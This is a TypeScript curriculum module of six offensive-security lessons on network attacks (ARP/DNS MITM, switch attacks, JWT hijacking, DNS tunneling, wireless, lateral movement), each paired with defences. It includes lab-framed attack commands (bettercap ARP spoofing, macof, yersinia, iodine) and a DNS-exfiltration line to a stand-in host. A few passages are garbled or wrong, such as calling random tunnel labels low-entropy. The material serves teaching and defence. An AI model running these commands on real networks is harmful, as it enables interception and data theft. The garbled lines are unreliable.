import type { Module } from "../curriculum";

export const module30: Module = {
  id: "module-30",
  slug: "30-network-attacks",
  title: "Network Attacks: MITM, Wireless & Abuses",
  description:
    "ARP spoofing, MITM, DNS poisoning, DHCP starvation, VLAN/switch attacks, session hijacking, wireless dogma — the Layer-2-to-4 attack kitchen.",
  language: "Offensive",
  lessons: [
    {
      id: 1,
      slug: "01-mitm-arp-dns-attacks",
      title: "MITM: ARP Spoofing & DNS Poisoning",
      level: "intermediate",
      tag: "lab",
      duration: "50 min",
      description:
        "On-path attacks against LANs: spoof identities, sniff traffic, downgrade and inject — and the defenses (dynamic ARP, SDA, TLS).",
      content: `
# MITM: ARP Spoofing & DNS Poisoning

## The LAN assumption

On a switched Ethernet LAN, traffic between hosts goes point-to-point. But switching trusts **ARP and L2 tables**, which we can abuse to insert ourselves on-path.

## ARP spoofing (the classic)

1. Host A wants to reach gateway → sends ARP "who has IP X?"
2. Attacker replies for BOTH A and gateway: "I have that IP" (MAC = attacker)
3. All A⇄gateway traffic now flows through the attacker

\`\`\`
# bettercap (modern), authorized lab:
sudo bettercap -iface eth0 -eval '
  set arp.spoof.targets 10.0.0.30; arp.spoof on; net.sniff on'
\`\`\`

## DNS poisoning / spoofing

- **Attacker-in-the-middle**: rewrite DNS answers → victim resolves evil.com to attacker IP
- Or ARP-spoof the DNS server itself
- Victim visits "bank.com" but reaches the attacker's page (if TLS isn't total, or via typosite with stolen certs)
- For the lab: bettercap/ettercap dns_spoof module

## Sniffing the reward

\`\`\`
# capture what flows through you
tcpdump -i eth0 -w mitm.pcap
tshark -r mitm.pcap -Y 'http.request.method==GET || http.request' 
# observe plaintext usernames/passwords -> then REPORT how TLS fixes it
\`\`\`

## The defense table

| Defense | Kills |
|---------|-------|
| **Dynamic ARP Inspection** (DAI, on the switch) | ARP spoofing at port |
| **802.1X** (per-port auth) | Unauthenticated devices cannot MITM |
| **TLS everywhere** (HSTS, cert pinning) | Even on-path attacker reads nothing |
| **BPDU guard + DHCP snooping** | Switch-side hygiene |
| **Static ARP / DHCP reservations** (small nets) | Practical for labs |

> MITM labs teach the "why TLS" question better than any slide: sniff a plaintext HTTP login between your own VMs and watch credential bytes flow past you.
`,
      defaultCode: `# LAB ONLY, your own VMs:
sudo bettercap -iface eth0 -eval 'set arp.spoof.targets 10.0.0.30; arp.spoof on; net.sniff on'
# from the victim, visit http://local-app or ls -> check attacker capture`,
      solution: `sudo bettercap -iface eth0 -eval 'set arp.spoof.targets 10.0.0.30; arp.spoof on; net.sniff on'`,
      hint: "ARP lies about MACs, DNS lies about names; the fix is per-interface and per-connection identity.",
      challenge: `**Home Lab — MITM the Lab:**
1. Get 3 VMs: Kali (attacker), victim, and a simple HTTP server (or DVWA).
2. bettercap ARP spoof between victim and gateway.
3. From victim, hit the HTTP site; read the credentials in tshark.
4. Repeat with the site on HTTPS (or add HSTS) → what do you see now?
5. On a switch (or in GNS3), enable DAI + 802.1X and prove the spoof fails.`,
    },
    {
      id: 2,
      slug: "02-layer2-switch-attacks",
      title: "Layer-2 & Switch Attacks",
      level: "advanced",
      tag: "lab",
      duration: "45 min",
      description:
        "MAC flooding, VLAN hopping, STP abuse, DHCP starvation — attacking the switch that thinks it's just plumbing.",
      content: `
# Layer-2 & Switch Attacks

## MAC flooding (CAM table overflow)

- Send thousands of fake MACs → switch CAM saturates → uninformed ports flood all frames (back to HUB behavior)
- Then sniff everything on the LAN
\`\`\`
macof -i eth0                  # dsniff suite MAC flooder
\`\`\`

## VLAN hopping

- **Double tagging (802.1Q)**: send a frame with two VLAN tags; switch strips outer, forwards inner to the target VLAN — breaking segmentation
- **Switch spoofing / DTP**: negotiate trunking (DTP) as if you were a switch → join multiple VLANs
\`\`\`
# set your interface to trunk mode in the lab environment
# (e.g., in GNS3/pfSense) then a nested VLAN1-tagged frame traverses
\`\`\`

## DHCP starvation & rogue DHCP

- Flood DHCP discoveries → exhaust the pool → clients cannot get an IP
- Deploy your own rogue DHCP server → hand out you-as-gateway → easy MITM
\`\`\`
yersinia dhcp  -test
\`\`\`

## STP abuse

- Send Bridge Protocol Data Units claiming you are root bridge → network reconverges through you (timing/DoS, MITM potential)

## Defenses (the switch stack)

| Control | Stops |
|---------|-------|
| **Port security / MAC limits** | Cam overflow |
| **BPDU guard** | STP abuse on access ports |
| **PortFast + root guard** | STP misroot |
| **DHCP snooping** + **trusted ports** | rogue DHCP |
| **Dynamic ARP Inspection** | ARP spoof |
| **802.1X** | The whole game — authenticate the device first |
| **VLAN hygiene** | double-tagging (native VLAN changes, no user ports on native/trunk) |

## Learning point

Switches are NOT a security boundary by default — they're a convenience layer. Trusting "we're switched, so it's safe" is 1998 thinking. Segmentation is only as strong as your *enforcement* of it.

> Every L2 attack is essentially 'the switch is gullible'. Harden the switch: authenticate devices, lock ports, verify DHCP/ARP.
`,
      defaultCode: `# LAB ONLY: prove responsiveness of controls via scripts is conceptual
# simulate MAC flood (dsniff): 
sudo macof -i eth0 -n 1000
# then check on the switch: show mac address-table | count  (saturates)
# defend (Cisco-ish): 
#   int g0/1 ; switchport port-security  mac-address sticky  max 5
#   spanning-tree bpduguard enable ; spanning-tree portfast`,
      solution: `sudo macof -i eth0 -n 1000
# Switch: port-security max 5, bpduguard, portfast — then re-test the flood.`,
      hint: "Authenticate + lock every access port. That defeats most L2 attacks.",
      challenge: `**Home Lab — Lock a Port:**
1. In GNS3 or a lab switch: enable port security (mac limit 5, violation restrict).
2. MAC-flood from your VM; verify the port goes 'err-disabled' or blocks.
3. Try DHCP starvation then enable DHCP snooping (trusted uplink) — repeat starvation, note the suppression.
4. Write: which two controls deliver the most L2 protection, in your test?`,
    },
    {
      id: 3,
      slug: "03-session-hijacking",
      title: "Session & Token Hijacking",
      level: "advanced",
      tag: "concept",
      duration: "40 min",
      description:
        "JWT theft, session fixation, cookie replay, token side-channels, and the browser/session defenses that stop the hijack.",
      content: `
# Session & Token Hijacking

## What session hijacking is

Attacker obtains a victim's *identifier* (session cookie, JWT, bearer token) and impersonates them — often without knowing the password.

## Attack vectors

| Vector | How |
|--------|-----|
| **Cookie theft** | XSS → \`document.cookie\` → send high-value token off-site |
| **Session fixation** | Attacker *sets* the session ID; victim authenticates the attacker's session; attacker then uses it |
| **CSRF-adjacent** | Victim, while logged in, submits a crafted request carrying their token |
| **Replay / theft via MITM** | Steal the token in transit (if TLS/HTTP-flow mishandled) |
| **JWT weaknesses** | alg:none, alg confusion (RS256→HS256), weak secret, missing expiry |
| **Token side-channels** | Token in URL (leaks to Referer/logs), in localStorage where XSS reads it |

## JWT attack micro-quick-reference

\`\`\`
# try alg:none
{"alg":"none","typ":"JWT"} . <payload> . "" of the jwt.io form

# algorithm confusion RS256 -> HS256 using the PUBLIC key as the HMAC secret
# weak secret crack: hashcat -m 16500 jwt.txt rockyou.txt

# missing 'exp' -> never expires; try future times
\`\`\`

## Countermeasures (beyond 'how' the attack works)

- **HttpOnly cookies** for the session token (XSS can't read them)
- **Secure + SameSite** (Lax/Strict) attributes guard CSRF + transit
- **Short-lived + refresh rotation**: token leaks die fast
- **Bind token to risk**: re-auth (MFA) on privilege change; new session ID on login (fixation)
- **Never in URL**; keep JWT secrets out of source
- **WAF/filter** on auth headers; monitor abnormal token usage

## Detection mindset

- Sudden geography/user-agent change + a valid token = replay
- Same token from two IPs at once
- Token without logout/invalidate pattern — session management logs triage this

> Token craft + session attributes + rotation is a triangle; your countermeasures must cover all three edges.
`,
      defaultCode: `// Model session attribute hardening
const cookie = {
  name: 'sid',
  httpOnly: true,
  secure: true,
  sameSite: 'Lax',
  rotating: true
};
const safe = cookie.httpOnly && cookie.secure && cookie.sameSite !== 'None';
console.log('Session cookie hardened:', safe);`,
      solution: `const cookie = {
  name: 'sid',
  httpOnly: true,
  secure: true,
  sameSite: 'Lax',
  rotating: true
};
const safe = cookie.httpOnly && cookie.secure && cookie.sameSite !== 'None';
console.log('Session cookie hardened:', safe);`,
      hint: "HttpOnly + Secure + SameSite + rotation + binding = token theft denied the payoff.",
      challenge: `**Home Lab — Token Hygiene Audit:**
1. Log into a site you use; inspect its session cookie (DevTools → Application).
2. Check HttpOnly, Secure, SameSite attributes; JWT? in localStorage?
3. Craft an XSS-free demo: how would CSRF differ if SameSite were None?
4. (Lab) Create a toy JWT with alg:none and confirm it's accepted by any lax demo server you run.
5. Write: what three session-setting changes would your favorite site most benefit from?`,
    },
    {
      id: 4,
      slug: "04-dhcp-dns-tunneling",
      title: "DHCP Abuses & DNS Tunneling",
      level: "advanced",
      tag: "lab",
      duration: "40 min",
      description:
        "Rogue DHCP, DHCP advisory hijacking, and DNS tunneling as exfiltration channel — with the network device telemetry that catches them.",
      content: `
# DHCP Abuses & DNS Tunneling

## Rogue DHCP (reprise, deepened)

- Attacker runs a DHCP server → controls IP/gateway/DNS handed to clients
- Including **option 12 (hostname), option 15 (domain), option 150 (TFTP)** — real-world exploits target these for config poisoning (e.g., DHCP "faked TFTP PXE" attacks)
- Client blindly trusts the offer — the point of attack

## DNS tunneling as exfil

DNS queries usually can't be blocked entirely. Encoding data in subdomain labels lets data out even with egress filters:

\`\`\`
# conceptual: hobbyists use dnscat2 / iodine
# query:  <base64-of-chunk>.exfil-attacker.com
# attacker's authoritative server decodes chunks -> reassembles
\`\`\`

- Rate: ~1-8KB/s (enough for tiny leaks / C2 command streams)
- Modes: TXT/RDATA payloads (RDATA tunneling), subdomain label, over UDP+TCP

## Detection of DNS tunneling

- Unusually high query count to ONE domain
- Random-looking subdomain strings (low entropy, base58/base64 alphabet)
- High DNS bytes/query variance; long labels; TXT records from strange names
- Compare to baselines (Queries/day is stable for normal users)

## Practical (lab only)

\`\`\`
# set up iodine server on Kali + tunnel test to prove the model:
sudo apt install iodine
iodined -f -c -P secret 10.0.0.10 t1.yourowndomain
# client: iodine -P secret t1.yourowndomain
# now a route appears: 10.0.0.10 as your DNS->tunnel gateway
\`\`\`

> Takeaway for defenders: WiFi-layer changes are only part of it. GET the DNS logs. A tunnel in DNS = a door someone built, and the alert is right there in the query volume.
`,
      defaultCode: `# Concepts in play (lab): check your own DNS query volume
# count unique queries the resolver saw recently (Syslog/SOAR example)
# In a SIEM query you might:
#   table src_ip, dst_domain, count(*) as n
#   where n > 500 and dst_domain like '%.t1.example'  
echo 'Detect: high volume + random labels + one domain = DNS tunnel lead'`,
      solution: `# SIEM-style detection sketch:
# table src_ip, dst_domain, count(*) group by dst_domain
# where dst_domain endswith '.t1.example' and count > 100
echo 'Detect: high volume + random labels + one domain = DNS tunnel lead'`,
      hint: "DNS tunneling is a traffic-pattern story — volume + entropy + one destination.",
      challenge: `**Home Lab — Prove the Tunnel Model:**
1. (If domain/hardware available) run iodine between Kali and a small authoritative zone you control — transfer a file, time it.
2. If no domain: read about dnscat2 and write the detection feature list.
3. On a lab where you're the DNS admin, generate noise (e.g., a script doing random-label queries) and write the rule that catches it.
4. Write 4 lines: threshold, label-entropy, record-type mix — your detection recipe.`,
    },
    {
      id: 5,
      slug: "05-wireless-attacks-defense",
      title: "Wireless Attacks & Security",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "Captive portals, evil twins, WPA3 reality, rogue APs, and the enterprise 802.1X/WIPS stack that keeps the air honest.",
      content: `
# Wireless Attacks & Security

## Wireless = the new front door

Wi-Fi is wireless, un-walled, and ubiquitous; SOHO routers ship insecure by default. It's also the fastest entry vector for real-world compromises.

## Attack catalog (and its fixes)

| Attack | How | Defense |
|--------|-----|---------|
| **Evil twin** | Clone SSID at high signal; captive portal steals creds | WPA3/WPA2-enterprise w/ certs; user skepticism; WIPS |
| **Captive portal phishing** | Cloned login page + deauth of legit AP | unique SSIDs, EAP-TLS, training |
| **Deauth / DoS** | aireplay-ng flood kills clients | deauth detection on WIPS |
| **WPS PIN brute** | Reaver/airgeddon | disable WPS |
| **WPA2 handshake crack** | aircrack the 4-way | strong passphrase + WPA3 (no handshake crack); 802.1X |
| **KRACK / Dragonblood** | WPA2/WPA3 protocol bugs | patch AP/firmware; WPA3 transitional |
| **Rogue AP / pineapple** | extra 'friendly' AP=sniffer | 802.1X + WIPS/monitoring |

## Enterprise wireless: the real solution

\`\`\`
WPA2-Enterprise / WPA3-Enterprise + RADIUS + 802.1X EAP-TLS:
- Each client gets a cert; password-only EAP-PEAP (MSCHAPv2) also cracked via hash attacks — prefer EAP-TLS (cert-only)
- MAB (MAC Auth Bypass) for printers → still a hole
- NPS/RADIUS sends authentication to AAA; logs every session
\`\`\`

## WIPS (Wireless IPS)

Probes the air for: rogue APs, evil twins, deauth storms, mis-assoc. Plus RF monitoring. Enterprise-grade WIPS (or at minimum a periodic **Wi-Fi scanner** like Kismet) is your '802.11 IDS'.

## Behavior you learn as the defender

- **Inventory** your SSID + neighbors (visual Wifi-scan)
- **Know your SSID's MAC** — evil twin disguises name not always BSSID
- Method = your SSID uses WPA3 with PMF (protection management frames) → response to deauth storms
- If a box can't do WPA2/WPA3/802.1X → it shouldn't be on the enterprise network

> On the airwaves, identity is everything. The certificate you hold decides whether you're you.
`,
      defaultCode: `# wireless hygiene you can run at home (on your own AP)
# 1) audit what bands/SSIDs exist near you (passive)
sudo airmon-ng start wlan0 ; sudo airodump-ng wlan0mon
# 2) after audit stop monitor mode:
sudo airmon-ng stop wlan0mon
# 3) enterprise example (concept): RADIUS will enforce EAP-TLS certs per user`,
      solution: `sudo airmon-ng start wlan0; sudo airodump-ng wlan0mon
sudo airmon-ng stop wlan0mon`,
      hint: "WPA3 + PMF + 802.1X/EAP-TLS + WIPS = the enterprise stack; unique passphrases at home.",
      challenge: `**Home Lab — Wireless Posture Check:**
1. passive-scan your own airspace; list SSIDs/bands/ciphers (WPA2? WPA3? open?).
2. Evaluate: which of YOUR home APs are open/WPS-enabled? Disable what you can.
3. Write the 'worst neighbor config' you saw (open AP, WEP relic, no PMF).
4. For a SOHO: pick the single best wireless hardening step and do it.
5. Sketch: how would you roll EAP-TLS to 5 of your own devices (what PKI would they need)?`,
    },
    {
      id: 6,
      slug: "06-egress-ddos-lateral",
      title: "Egress Abuse, DoS & Lateral Patterns",
      level: "advanced",
      tag: "concept",
      duration: "40 min",
      description:
        "The endgame moves inside a network: egress exfil tricks, DoS patterns, and how lateral movement is detected — synthesized for the red and blue mind.",
      content: `
# Egress Abuse, DoS & Lateral Patterns

## Egress abuse (data leaving)

- HTTP(S) POST exfil to unlisted domains
- DNS tunneling (already covered)
- Cloud storage abuse (Drive/Dropbox URLs)
- Email exfil (SMTP), IM
- Steganography in images; appended blobs after valid content

## DoS patterns (a checklist)

- **Volumetric** (L2-L4 amplification): DNS/NTP/SSDP reflection, SYN flood
- **Protocol/stateful**: slowloris (hang connections), resource exhaustion (open many TCP), TCP state table overflow
- **Application**: HTTP flood, login storms, expensive-query floods, PDF-render bombs, zip-bombs on unpack
- **Physical**: switch MAC floods, STP thrashing (covered earlier)

## Lateral movement taxonomy

- Remote code exec (ps/x/x), WMI, scheduled tasks, winRM, SSH
- Shared credentials/key material (pwdump → spray)
- Token/PnT (PtH, pass-the-cache)
- RDP with stolen creds
- **Detection backbone**: network logs of new SMB/TCP-135 sessions, unusual cmd/pss child processes, Kerberos Service Ticket requests for exotic services

## The synthesis

Think in **sessions and artifacts**:

- Who talks to whom on what port, at what cadence, to what dst IP?
- Are there NEW internal connections (the #1 lateral signal)?
- Is data egressing (post-login bulk bytes)?

A single 'flat' week of logs yields 100 candidate signals; a configured analytics engine turns the top 5 into alerts.

> Every phase in an attack has a signature in the *session* not the file. Sessions are the bloodstream; learn to read them and both offense and defense become physics rather than luck.
`,
      defaultCode: `// Boil lateral movement to a session-watch checklist
const watch = {
  internalExdevNew: ['445','135','5985'],
  processChains: ['spawns-powershell','spawns-cmd'],
  credUsage: ['ptt','pth','pws'],
  dataLeaving: 'bulk-egress-post-login'
};
console.log('Watchlist entries:', Object.keys(watch).length);`,
      solution: `const watch = {
  internalExdevNew: ['445','135','5985'],
  processChains: ['spawns-powershell','spawns-cmd'],
  credUsage: ['ptt','pth','pws'],
  dataLeaving: 'bulk-egress-post-login'
};
console.log('Watchlist entries:', Object.keys(watch).length);`,
      hint: "Detect by session, not by file: new internal 445/135 flows + ps children = lateral.",
      challenge: `**Home Lab — Turn Logs Into a Playbook:**
1. Generate representative traffic in your lab: SSH login, SMB session, HTTP exfil-like POST.
2. Build a spreadsheet: src, dst, port, time, bytes — the 'session view'.
3. Write rule ideas for: new SM filet moved, high bytes post-login, repeated 445 to a server.
4. For each, note legitimate-work false-positive cause.
5. Write the one-page 'lateral movement playbook' an analyst would use.`,
    },
  ],
};